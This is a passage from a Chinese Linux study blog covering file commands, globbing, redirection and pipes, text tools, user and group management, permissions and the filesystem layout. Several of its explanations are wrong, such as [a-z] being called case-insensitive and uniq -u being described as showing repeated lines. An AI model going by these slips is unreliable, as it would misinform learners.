<p>1.如果目标文件不存在，就创建一个同名文件，然后将src中的数据复制过去，并删除src的源文件</p>
<p>2.如果目标文件存在：</p>
<p>如果是目标是文件，就是覆盖</p>
<p>如果是目录，就新建一个同名文件，然后复制数据，删除源文件</p>
<p><strong>mv SRC… DEST</strong></p>
<p>同cp命令的这种情况，如果移动的是目录，不需要额外的添加选项</p>
<p>tips:如果mv到同一个目录下，可以视作重命名</p>
<p>mv命令常用选项也就是<code>-i</code>、<code>-f</code></p>
<h3 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h3><p>常用选项：</p>
<p><code>-r</code>、<code>-f</code></p>
<p>用于删除文件，基本的使用很简单，但是要注意的是使用递归删除风险很大，使用需谨慎。</p>
<h2 id="bash-的基础特性-2"><a href="#bash-的基础特性-2" class="headerlink" title="bash 的基础特性(2)"></a>bash 的基础特性(2)</h2><h3 id="1-命令别名"><a href="#1-命令别名" class="headerlink" title="1.命令别名"></a>1.命令别名</h3><p>通过alias命令实现；</p>
<blockquote>
<p>alias:显示当前shell进程所有可用的命令别名</p>
<p>alias NAME=’VALUE’：定义别名NAME,其相当于执行命令VALUE</p>
<p>unalias:取消命令的别名</p>
</blockquote>
<p>注意：在命令行中定义的别名，仅对当前shell进程有效，如果要永久有效，要定义在配置文件中去：</p>
<p>当前用户有效：~/.bashrc</p>
<p>对所有用户有效：/etc/bashrc</p>
<p>在修改了配置文件之后，创建新的进程才会读取配置文件，如果想要当前进程也更改，可以使用命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#如让别名生效</div><div class="line">source .bashrc</div></pre></td></tr></table></figure>
<p>如果别名同原命令的名称，则要执行原命令，可使用”\COMMAND”</p>
<h3 id="glob-globbing"><a href="#glob-globbing" class="headerlink" title="glob(globbing)"></a>glob(globbing)</h3><p>bash中用于实现文件名”通配”</p>
<p>通配符：*，？，[]</p>
<p>1.*：任意长度的任意字符</p>
<p>a*b:aab、a123b、ab</p>
<p>2.?：任意的单个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm -rf ?.py</div></pre></td></tr></table></figure>
<p>3.[]：匹配指定范围内的任意的单个字符</p>
<p>[0-9]、[a-z]<code>不区分大小写</code>、[A-Z]<code>大写字母</code></p>
<p>4.[^]:匹配指定范围外的任意单个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls a[^0-9a-z]b</div></pre></td></tr></table></figure>
<p><strong>专用字符集合</strong>：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/67FB1FAF1A65123443B519A7321790B3.jpg" alt="67FB1FAF1A65123443B519A7321790B3.jpg" title="" class="">
                <p>67FB1FAF1A65123443B519A7321790B3.jpg</p>
            </figure>
<h3 id="bash的I-O重定向和管道"><a href="#bash的I-O重定向和管道" class="headerlink" title="bash的I/O重定向和管道"></a>bash的I/O重定向和管道</h3><p>打开的文件都有一个fd:file descriptor（文件描述符）</p>
<p>标准输入：keyboard，0</p>
<p>标准输出：monitor(显示器)，1</p>
<p>标准错误输出： monitor，2</p>
<h4 id="I-O重定向也就是改变标准位置："><a href="#I-O重定向也就是改变标准位置：" class="headerlink" title="I/O重定向也就是改变标准位置："></a>I/O重定向也就是改变标准位置：</h4><p><strong>1.输出重定向：</strong></p>
<blockquote>
<p>‘&gt;’    :    command &gt; NEW_POS    覆盖重定向，目标文件中原有内容会被消除</p>
<p>‘&gt;&gt;’  :    command &gt;&gt; NEW_POS    追加重定向，新内容会追加到目标文件尾部</p>
<p>‘2&gt;’  ：    command 2&gt; NEW_POS    将错误输出流覆盖重定向</p>
<p>‘2&gt;&gt;’:    command 2&gt;&gt; NEW_POS    将错误输出流追加重定向</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#禁止将内容覆盖输出至已有文件</div><div class="line">set -C</div><div class="line">#允许将内容覆盖输出至已有文件</div></pre></td></tr></table></figure>
<p>如果要强制覆盖则使用 <code>&gt;|</code></p>
<p>如果要使正确、错误输出到不同位置:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#如果是错误输出流则只会执行前面的，但是两个文件都会创建</div><div class="line">cat /etc/ssh/ssh_config &gt; /tmp/testfile 2&gt; /tmp/testfile2 </div><div class="line">#但是上述的写法太过麻烦，可以合并标准和错误输出为同一个数据流进行覆盖重定向，追加重定向同理</div><div class="line">echo $PATH &amp;&gt; /tmp/path.out</div><div class="line">#还有一种写法看起来更清晰一点</div><div class="line">echo $SHELL &gt; /tmp/path.out 2&gt;&amp;1</div></pre></td></tr></table></figure>
<p><strong>2.输入重定向</strong></p>
<blockquote>
<p>tr [OPTIONS…]… SET1 [SET2]        转换或删除字符</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-23%20%E4%B8%8B%E5%8D%883.48.35.png" alt="屏幕快照 2017-07-23 下午3.48.35.png" title="" class="">
                <p>屏幕快照 2017-07-23 下午3.48.35.png</p>
            </figure>
<p>如上图所示的例子，将输入的小写字母全部转换为大写字母输出</p>
<p>如果要删除字符可以使用修饰符<code>-d</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#删除所有的大写&apos;U&apos;</div><div class="line">tr -d &apos;U&apos;</div></pre></td></tr></table></figure>
<blockquote>
<p>HERE Document    ‘&lt;&lt;’</p>
</blockquote>
<p>当遇到’&lt;&lt;’后面的字符或字符串时停止输入，举个例子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-23%20%E4%B8%8B%E5%8D%883.57.38.png" alt="屏幕快照 2017-07-23 下午3.57.38.png" title="" class="">
                <p>屏幕快照 2017-07-23 下午3.57.38.png</p>
            </figure>
<p>当然我们也可以对输出在做一次重定向,用于保存我们键入的文档：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-23%20%E4%B8%8B%E5%8D%883.59.21.png" alt="屏幕快照 2017-07-23 下午3.59.21.png" title="" class="">
                <p>屏幕快照 2017-07-23 下午3.59.21.png</p>
            </figure>
<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>第一个命令的输出作为第二个命令的输入….依次类推</p>
<p>command1 | command2 | command3 |…</p>
<p>最后一个命令会在当前shell的子shell进程中执行</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%881.07.06.png" alt="屏幕快照 2017-07-25 下午1.07.06.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午1.07.06.png</p>
            </figure>
<p>如上图所示就是利用管道使配置文件在转换大小写的同时分屏显示</p>
<p> tee命令：</p>
<p>tee命令可以将显示在屏幕上的信息也保存一份在文件中，通常在管道中使用（注意，tee是覆盖输出的）</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%881.29.19.png" alt="屏幕快照 2017-07-25 下午1.29.19.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午1.29.19.png</p>
            </figure>
<p>练习测试：</p>
<p>1.将/etc/passwd文件中的前五行转换为大写保存至/tmp/passwd.out</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%881.33.01.png" alt="屏幕快照 2017-07-25 下午1.33.01.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午1.33.01.png</p>
            </figure>
<p>2.将登陆至当前系统上的用户信息的后三位的信息转换为大写后保存至/tmp/who.out文件中</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%881.35.08.png" alt="屏幕快照 2017-07-25 下午1.35.08.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午1.35.08.png</p>
            </figure>
<h3 id="文件处理工具"><a href="#文件处理工具" class="headerlink" title="文件处理工具"></a>文件处理工具</h3><p>接下来再来说一下一些文件处理的工具：</p>
<p>1.<code>wc</code>命令，常用选项：<code>-l</code>,<code>-w</code>,<code>-c</code></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%881.55.35.png" alt="屏幕快照 2017-07-25 下午1.55.35.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午1.55.35.png</p>
            </figure>
<p>2.<code>cut</code>命令，将文件切割成段来显示，并使用修饰符来达到我们的目的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#-d修饰符表示以什么作为分隔,-f表示显示文件的第几段</div><div class="line">cut -d : -f 1,2 /etc/passwd</div></pre></td></tr></table></figure>
<p>还有一个修饰符可以自定的替换分隔符：<code>--output-delimiter</code></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-25%20%E4%B8%8B%E5%8D%882.12.09.png" alt="屏幕快照 2017-07-25 下午2.12.09.png" title="" class="">
                <p>屏幕快照 2017-07-25 下午2.12.09.png</p>
            </figure>
<p>3.<code>sort</code>命令，对文本排序</p>
<blockquote>
<p>-f:忽略大小写</p>
<p>-r:逆序</p>
<p>-t  DELIMITER:字段分隔符</p>
<p>-k:以指定字段为标准来排序</p>
<p>-n:以数值大小进行排序</p>
<p>-u:去重显示，相同的命令只显示一次</p>
</blockquote>
<p>4.uniq命令：</p>
<p>tips:连续且一样才叫重复</p>
<p>uniq是一个用来去重的命令，相较于<code>sort -u</code>来说，有一些独有的特性</p>
<blockquote>
<p>-u：仅显示重复过的行</p>
<p>-c：显示每行重复的次数</p>
<p>-d：仅显示重复过的行</p>
</blockquote>
<h2 id="用户及组管理"><a href="#用户及组管理" class="headerlink" title="用户及组管理"></a>用户及组管理</h2><p>用户机制实质上是实现资源分派的机制：</p>
<blockquote>
<p>Authentication:认证</p>
<p>Authorization:授权</p>
<p>Accounting:审计</p>
</blockquote>
<h4 id="Linux用户：Username-UID"><a href="#Linux用户：Username-UID" class="headerlink" title="Linux用户：Username/UID"></a>Linux用户：Username/UID</h4><blockquote>
<p>管理员：root，0</p>
<p>普通用户：1-65535</p>
<p>—系统用户：1-499（不同发行版本不一样）</p>
<p>对守护进程获取资源进行权限分配</p>
<p>—普通用户：500+</p>
<p>交互式登陆</p>
</blockquote>
<h4 id="Linux组：Groupname-GID"><a href="#Linux组：Groupname-GID" class="headerlink" title="Linux组：Groupname/GID"></a>Linux组：Groupname/GID</h4><blockquote>
<p>管理员组：root，0</p>
<p>普通组：</p>
<p>—系统组：1-499(不同发行版本不一样)</p>
<p>—普通组：500+</p>
</blockquote>
<h4 id="Linux的安全上下文"><a href="#Linux的安全上下文" class="headerlink" title="Linux的安全上下文"></a>Linux的安全上下文</h4><p>运行中的程序：进程（process）以进程发起者的身份去执行</p>
<p>进程所能够访问的所有资源的权限取决于进程发起者的身份</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/9AE0B66687A4F6228B1234C0E7FF34F1.jpg" alt="9AE0B66687A4F6228B1234C0E7FF34F1.jpg" title="" class="">
                <p>9AE0B66687A4F6228B1234C0E7FF34F1.jpg</p>
            </figure>
<p>/etc/passwd:</p>
<p>​name : passwd : UID: GID: GESOS : directory : shell </p>
<p>/etc/group:</p>
<p>​group_name : password : GID : user_list</p>
<p>组名：密码：GID：以当前组为附加组的用户列表（分隔符为逗号）</p>
<p>/etc/shadow</p>
<p>用户名：加密了的密码 ：最近一次更改密码的日期 ：密码的最小使用期限 ： 最大密码使用期限 ：密码警告时间段 ：密码禁用期 ：账号的过期日期</p>
<p>加密机制：</p>
<blockquote>
<p>加密：明文—&gt;密文</p>
<p>解密：密文—&gt;明文</p>
</blockquote>
<p>单向加密：提取数据指纹</p>
<blockquote>
<p>md5:message digest , 128bits</p>
<p>sha1:secure hash algorithm（安全的哈希算法）,160bits</p>
<p>sha224:224bits</p>
<p>sha256…sha512等·都是一样的道理</p>
</blockquote>
<p>如果在linux中有两个用户的登录密码是相同的，所以为了避免密码被猜出，密码在被加密的时候会被加上一段杂质，然后这样再加密生成的密码就完全看不出来了。</p>
<h3 id="用户和组相关的管理命令"><a href="#用户和组相关的管理命令" class="headerlink" title="用户和组相关的管理命令"></a>用户和组相关的管理命令</h3><h4 id="用户创建"><a href="#用户创建" class="headerlink" title="用户创建"></a>用户创建</h4><p>所谓的创建用户事实上是从/etc/skel目录中将一些信息复制到新用户的家目录中去</p>
<table>
<thead>
<tr>
<th>useradd [options] LOGIN</th>
<th>LOGIN是用户名，也就是登录名</th>
</tr>
</thead>
<tbody>
<tr>
<td>-u UID:[UID_MIN, UID_MAX]</td>
<td>定义在/etc/login.defs中</td>
</tr>
<tr>
<td>-g GID:</td>
<td>指明用户所属基本组，可为GID或者组名</td>
</tr>
<tr>
<td>-c  “Comment”</td>
<td>用户的注释信息</td>
</tr>
<tr>
<td>-d  /path</td>
<td>以指定的目录为家目录，那个目录最好为空</td>
</tr>
<tr>
<td>-s   /bin/shell</td>
<td>指定默认的shell,可用列表在/etc/shells文件中</td>
</tr>
<tr>
<td>-r</td>
<td>创建一个系统用户(centos6:id&lt;500、centos7:id&lt;1000)</td>
</tr>
</tbody>
</table>
<h4 id="组创建"><a href="#组创建" class="headerlink" title="组创建"></a>组创建</h4><table>
<thead>
<tr>
<th>groupadd (options) groupname</th>
<th>添加一个组</th>
</tr>
</thead>
<tbody>
<tr>
<td>-g GID</td>
<td>指明GID号</td>
</tr>
<tr>
<td>-r</td>
<td>创建一个系统组</td>
</tr>
</tbody>
</table>
<h4 id="查看用户相关的ID信息"><a href="#查看用户相关的ID信息" class="headerlink" title="查看用户相关的ID信息"></a>查看用户相关的ID信息</h4><table>
<thead>
<tr>
<th>id [options]…[USERS]</th>
<th>查看信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>-u</td>
<td>UID</td>
</tr>
<tr>
<td>-g</td>
<td>GID</td>
</tr>
<tr>
<td>-G</td>
<td>groups</td>
</tr>
<tr>
<td>-n</td>
<td>name</td>
</tr>
</tbody>
</table>
<h2 id="用户及权限管理"><a href="#用户及权限管理" class="headerlink" title="用户及权限管理"></a>用户及权限管理</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="切换用户或以其他用户身份执行命令"><a href="#切换用户或以其他用户身份执行命令" class="headerlink" title="切换用户或以其他用户身份执行命令"></a>切换用户或以其他用户身份执行命令</h4><p>切换用户的方式：</p>
<p>su UserName:非登录式切换，即不会读取目标用户的配置文件</p>
<p>su - UserName：登陆式切换，会读取目标用户的配置文件，完全切换</p>
<p>su - UserName -c ‘COMMAND’ 换个身份执行命令</p>
<h4 id="用户-组属性修改"><a href="#用户-组属性修改" class="headerlink" title="用户/组属性修改"></a>用户/组属性修改</h4><p>usermod [options] login</p>
<p>这个命令的选项和useradd差不多，只不过意思是重新设置相关的属性，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">usermod -g 2000 peterpan #表示重新设置用户peterpan的基本组</div><div class="line">usermod -G mygrp peterpan #新附加组，原来的附加组将会被覆盖，若要保留原有，则要同时使用-a（append）选项</div><div class="line">usermod -d /homepath  #新的家目录，原有的目录中的文件不会同时移动到新的家目录，如果要移动，要同时加上-m选项</div><div class="line">usermod -l login_name #新的名字</div><div class="line">usermod -L user_name  #lock指定用户</div><div class="line">usermod -U user_name  #解锁指定用户</div></pre></td></tr></table></figure>
<p>groupmod [options] group</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">groupmod -n pan peterpan  #新名字</div><div class="line">groupmod -g 200 peterpan  #修改GID</div></pre></td></tr></table></figure>
<h4 id="给用户-组添加密码"><a href="#给用户-组添加密码" class="headerlink" title="给用户/组添加密码"></a>给用户/组添加密码</h4><p>passwd  username</p>
<p>修改指定用户的密码，仅限root权限，如果仅仅是passwd，就是修改当前用户的密码，当前用户就可以修改</p>
<p>因为passwd命令是修改/etc/shadow文件，所以可以修改在这个文件中参数，如修改密码的时间等</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/6973EC7222C204B5D6414903CE6AF26E.jpg" alt="6973EC7222C204B5D6414903CE6AF26E.jpg" title="" class="">
                <p>6973EC7222C204B5D6414903CE6AF26E.jpg</p>
            </figure>
<p>gpasswd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gpasswd -a user mygrp #将user添加至指定用户组</div><div class="line">gpasswd -d user mygrp #将用户从指定组中删除,如果该组为这个用户的基本组无法删除</div><div class="line">gpasswd -A user1,user2 mygrp  #设置有管理权限的用户列表</div></pre></td></tr></table></figure>
<p>newgrp</p>
<p>临时切换基本组，如果用户本不属于此组，则需要输密码</p>
<h4 id="删除用户-组"><a href="#删除用户-组" class="headerlink" title="删除用户/组"></a>删除用户/组</h4><p>userdel [options]… login</p>
<p>-r：删除用户家目录</p>
<p>groupdel  group</p>
<h4 id="验证本地认证信息的正确性"><a href="#验证本地认证信息的正确性" class="headerlink" title="验证本地认证信息的正确性"></a>验证本地认证信息的正确性</h4><p><strong>pwck</strong> 命令通过检查全部用户的定义来验证用户数据库文件中密码信息的正确性。<strong>pwck</strong> 命令内部调用带有 <strong>-n</strong> 和 <strong>ALL</strong> 选项的 <strong>pwdck</strong>命令。</p>
<h4 id="修改用户密码过期信息"><a href="#修改用户密码过期信息" class="headerlink" title="修改用户密码过期信息"></a>修改用户密码过期信息</h4><p>chage命令：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/1E40EA4891F54EE870F89ECEC563EEB3.jpg" alt="1E40EA4891F54EE870F89ECEC563EEB3.jpg" title="" class="">
                <p>1E40EA4891F54EE870F89ECEC563EEB3.jpg</p>
            </figure>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><p>chfn:修改指纹信息</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-26%20%E4%B8%8B%E5%8D%882.46.15.png" alt="屏幕快照 2017-07-26 下午2.46.15.png" title="" class="">
                <p>屏幕快照 2017-07-26 下午2.46.15.png</p>
            </figure>
<p>chsh:修改shell，如果不需要交互式可以加上选项<code>-s</code>和新shell的路径</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-26%20%E4%B8%8B%E5%8D%882.46.48.png" alt="屏幕快照 2017-07-26 下午2.46.48.png" title="" class="">
                <p>屏幕快照 2017-07-26 下午2.46.48.png</p>
            </figure>
<p>finger:查看指纹信息</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-26%20%E4%B8%8B%E5%8D%882.41.14.png" alt="屏幕快照 2017-07-26 下午2.41.14.png" title="" class="">
                <p>屏幕快照 2017-07-26 下午2.41.14.png</p>
            </figure>
<h3 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h3><p>文件的权限管理主要针对三类对象进行定义：</p>
<p>owner、group、other</p>
<p>每个文件针对每类访问者都定义了三种权限：r,w,x</p>
<p>文件：</p>
<p>​    r:可使用文件查看类工具获取其内容</p>
<p>​    w:可以修改其内容</p>
<p>​    x:可以把此文件提请内核启动为一个进程</p>
<p>目录：</p>
<p>​    r:可以获取此目录下的文件列表</p>
<p>​    w:可以在在此目录中创建文件，也可以删除此目录中的文件</p>
<p>​    x:可以使用<code>ls -l</code>命令查看此目录中的文件列表，也可以<code>cd</code>进入此目录</p>
<h4 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#修改权限的几种写法</div><div class="line">chmod -R 775 /tmp/test #-R表示递归修改权限</div><div class="line">chmod u(+/-)x /tmp/test    #修改一类用户的单个或某些位权限  </div><div class="line">chmod u=rwx /tmp/test  #修改一类用户的所有权限 </div><div class="line">chmod --reference=test.py test2.py. #以一个文件的权限为参照修改另一个文件的权限</div></pre></td></tr></table></figure>
<h4 id="修改文件的属主和属组"><a href="#修改文件的属主和属组" class="headerlink" title="修改文件的属主和属组"></a>修改文件的属主和属组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#其中选项的用法可以参考chmod</div><div class="line">chown tom fstab  #将文件的属主改为tom</div><div class="line">chown tom:wheel  #除了修改属主，将文件的属组改为wheel</div><div class="line">chgrp root /tmp/path.out  #专门修改属组的命令，选项可以参考chmod</div></pre></td></tr></table></figure>
<h4 id="文件或目录创建时的掩码：umask"><a href="#文件或目录创建时的掩码：umask" class="headerlink" title="文件或目录创建时的掩码：umask"></a>文件或目录创建时的掩码：umask</h4><p>文件：666-umask</p>
<p>如果某类用户的权限减得的结果中包含x权限，则将其权限加一</p>
<p>目录：777-umask</p>
<p>umask:查看</p>
<p>umask  #:设置umask的值</p>
]]></content>
      
        <categories>
            
            <category> 重定向和管道 用户、组权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day3]]></title>
      <url>/2017/08/15/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day3/</url>
      <content type="html"><![CDATA[<p>要了解一个操作系统首先就要了解它的文件系统<br><a id="more"></a></p>
<h1 id="Linux运维学习Day3"><a href="#Linux运维学习Day3" class="headerlink" title="Linux运维学习Day3"></a>Linux运维学习Day3</h1><h2 id="Linux上的文件系统"><a href="#Linux上的文件系统" class="headerlink" title="Linux上的文件系统"></a>Linux上的文件系统</h2><p>根文件系统（rootfs）：</p>
<p>正常的Linux文件系统都会遵从LSB，FHS（FileSystem Heirachy Standard）</p>
<p>文件系统分析：</p>
<p>/boot:引导文件的存放目录，内核文件（vmlinuz）、引导加载器（boot loader ,grub）都存放于此目录（只是在根上创建一个boot，然后把这个boot关联到一个独立的分区上）</p>
<p>/bin:可供所有用户使用的基本命令，不能关联至独立分区，OS启动即会用到的程序</p>
<p>/sbin:管理类的基本命令，同样不能关联至独立分区，OS启动即会用到的程序</p>
<p>/lib:存放基本共享库文件和内核模块</p>
<p>/lib64:专用于x86_64系统上辅助文件共享库存放的位置</p>
<p>/etc:配置文件目录(大多数都是纯文本文件)</p>
<p>/media:便携式移动设备挂载点（cdrom,usb）</p>
<p>/mnt:临时文件系统挂载点</p>
<p>/dev:设备文件和特殊文件存储位置</p>
<blockquote>
<p>b:block device 非线性访问设备 （随机访问）</p>
<p>c:character device  线性访问设备 （键盘，有次序访问）</p>
</blockquote>
<p>/opt:第三方应用程序安装位置</p>
<p>/srv:系统上运行的服务用到的数据</p>
<p>/tmp:临时文件存储位置</p>
<p>/usr(universal share ,read-only data):</p>
<blockquote>
<p>bin:保证系统拥有完整功能而提供的应用程序</p>
<p>sbin:保证系统拥有完整功能而提供的应用程序（管理员使用）</p>
<p>include:存放C程序头文件，头文件就是描述库的打开方式</p>
<p>lib/lib64:同上，存放库的位置</p>
<p>share:结构化独立的数据，例如doc、man等</p>
<p>local:第三方应用程序的安装位置：bin,sbin,lib,lib64,etc,share….</p>
</blockquote>
<p>/var:variable data files（经常修改的文件存放位置）</p>
<blockquote>
<p>cache:缓存数据目录</p>
<p>lib:应用程序状态信息数据</p>
<p>local：专门为/usr/local下的应用程序存储可变数据</p>
<p>lock:锁文件</p>
<p>log:日志目录及文件</p>
<p>opt:专门为/opt下的应用程序存储可变数据</p>
<p>run:运行中进程相关的数据，通常用于存储进程的pid文件</p>
<p>spool:应用程序数据池</p>
<p>tmp:保存系统两次重启之间产生的临时文件</p>
</blockquote>
<p>/proc:用于输出内核和进程信息相关的虚拟文件系统（将本来不是文件的输出成文件的样子，如进程文件只有一个参数）</p>
<p>/sys:用于输出当前系统上硬件设备相关信息的虚拟文件系统</p>
<p>/selinux:selinux相关的安全策略等信息的存储位置</p>
<h4 id="Linux下的文件类型"><a href="#Linux下的文件类型" class="headerlink" title="Linux下的文件类型"></a>Linux下的文件类型</h4><p>-（f）:普通文件</p>
<p>d:目录文件</p>
<p>b:块设备</p>
<p>c:字符设备</p>
<p>l:符号链接文件（软链接）</p>
<p>p:管道文件</p>
<p>s:套接字文件，socket,实现主机内的通信</p>
<h2 id="bash基础特性"><a href="#bash基础特性" class="headerlink" title="bash基础特性"></a>bash基础特性</h2><p>1.命令历史</p>
<blockquote>
<p>history：</p>
<p>—–环境变量：</p>
<p>———–HISTSIZE：命令历史记录的条数</p>
<p>———–HISTFILE：~/.bash_history</p>
<p>———–HISTFILESIZE: 命令历史<em>文件</em>记录历史条数</p>
</blockquote>
<p>调用上一条命令的最后一个参数（比较常用）</p>
<p>!$、ESC+.、Alt+.</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-21%20%E4%B8%8A%E5%8D%8811.55.49.png" alt="屏幕快照 2017-07-21 上午11.55.49.png" title="" class="">
                <p>屏幕快照 2017-07-21 上午11.55.49.png</p>
            </figure>
<p>控制命令历史的记录方式：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/EA941CB006CF15B6E71144131A294AFE.jpg" alt="EA941CB006CF15B6E71144131A294AFE.jpg" title="" class="">
                <p>EA941CB006CF15B6E71144131A294AFE.jpg</p>
            </figure>
<p>比如修改命令历史为忽略空格开头的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export HISTCONTROL=&quot;ignorespace&quot;;   #这样修改只对当前shell和它的子shell有效</div></pre></td></tr></table></figure>
<p>2.命令行展开</p>
<p>~：展开为用户的主目录</p>
<p>~USERNAME：展开为指定目录的主目录</p>
<p>{}:可承载一个以逗号分隔的列表，并将其展开为多个路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/tmp/&#123;a,b&#125; = /tmp/a /tmp/b</div><div class="line">/tmp/&#123;tom,jerry&#125;/hi = /tmp/tom/hi /tmp/jerry/hi</div></pre></td></tr></table></figure>
<p>3.命令的执行状态结果</p>
<p>bash使用特殊变量$?保存最近一条命令的执行状态结果</p>
<p>0:成功</p>
<p>1-255:失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $?   #通过打印来判断结果</div></pre></td></tr></table></figure>
<p>目录管理类命令：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/CE96188AB44DE3ED6B7F8D0DED5871BC.jpg" alt="CE96188AB44DE3ED6B7F8D0DED5871BC.jpg" title="" class="">
                <p>CE96188AB44DE3ED6B7F8D0DED5871BC.jpg</p>
            </figure>
<p>文本文件查看类命令：</p>
<p>cat,more,less,tail,head</p>
<p>其中cat除了不能翻页，其他的功能和more,less类似，但是cat可以将多个文件合并成一个文件</p>
<p>那么head和tail又有什么区别呢，除了一个从头部开始显示，一个是从尾部开始显示之外，tail较之head还有一个跟踪文件新增加的内容的功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#以向配置文件中写测试为例子</div><div class="line">tail -f /etc/rc.d/xxx</div><div class="line">echo &quot;test&quot; /etc/rc.d/xxx  #这个时候用上述命令查看的就会实时跟踪显示</div></pre></td></tr></table></figure>
<p>文件的时间戳管理工具: touch</p>
<p>文件：metadata、data</p>
<p>查看文件状态：stat</p>
<p>文件状态有三个时间戳：</p>
<blockquote>
<p>access time:访问时间 ，简写为time，读取文件内容</p>
<p>modify time:修改时间， mtime,改变文件内容（数据）</p>
<p>change time: 改变时间，ctime， 元数据发生改变</p>
</blockquote>
<p>使用touch命令可以修改时间戳的信息和选择修改哪一项，但是最后一项是无法修改的</p>
<figure class="image-box">
